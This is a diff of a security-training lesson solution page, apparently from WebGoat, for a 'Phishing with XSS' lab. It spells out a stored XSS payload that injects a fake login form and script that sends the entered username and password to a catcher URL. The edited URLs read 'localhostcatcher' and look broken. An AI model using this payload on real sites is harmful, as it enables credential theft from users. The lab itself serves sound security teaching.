@@ -2,7 +2,7 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
 <title>Solution Lab Block Stored XSS</title>
-<link rel="stylesheet" type="text/css" href="/WebGoat/lesson_solutions/formate.css">
+<link rel="stylesheet" type="text/css" href="lesson_solutions/formate.css">
 </head>
 <body>
 <p><b>Lesson Plan Title:</b> Phishing with XSS</p>
@@ -18,7 +18,7 @@ hard for a victim to determinate that the content is malicious.
 <p><b>General Goal(s):</b><br/>
 The user should be able to add a form asking for username 
 and password. On submit the input should be sent to 
-http://localhost/WebGoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
+http://localhostcatcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
 </p>
 
 <b>Solution:</b><br/>
@@ -40,7 +40,7 @@ Now you need a script:
 <p>
 &lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials were just stolen."
 User Name = &quot; + document.forms[0].user.value + &quot;Password = &quot; +  document.forms[0].pass.value); 
-XSSImage=new Image; XSSImage.src=&quot;http://localhost/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;+
+XSSImage=new Image; XSSImage.src=&quot;http://localhostcatcher?PROPERTY=yes&amp;user=&quot;+
 document.forms[0].user.value + &quot;&amp;password=&quot; + document.forms[0].pass.value + &quot;&quot;;}
 &lt;/script&gt;
 </p>
@@ -52,7 +52,7 @@ calls the script. You can reach this wicht the onclick="myFunction" handler.
 The final String looks like this:<br/>
 &lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials were just stolen.
 User Name = &quot; + document.forms[0].user.value + &quot;Password = &quot; +  document.forms[0].pass.value); 
-XSSImage=new Image; XSSImage.src=&quot;http://localhost/WebGoat/catcher?PROPERTY=yes&amp;user=&quot;+
+XSSImage=new Image; XSSImage.src=&quot;http://localhostcatcher?PROPERTY=yes&amp;user=&quot;+
 document.forms[0].user.value + &quot;&amp;password=&quot; + document.forms[0].pass.value + &quot;&quot;;}
 &lt;/script&gt;&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
 &gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; 
